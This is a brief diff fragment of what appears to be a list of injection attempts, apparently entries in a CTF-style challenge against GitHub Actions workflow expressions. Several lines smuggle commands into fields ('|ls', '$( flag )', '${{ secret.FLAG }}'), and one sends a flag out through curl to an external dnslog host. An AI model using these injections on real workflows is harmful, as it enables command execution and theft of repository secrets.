@@ -595,3 +595,4 @@ R1gelX29:${{ secret.FLAG }};
 /bin/bash -e "curl $flag.sxhx72.dnslog.cn";
 |ls;
 matoujin:ls
+xikong-mubai:${{ github.event.issue.number }} $( flag )
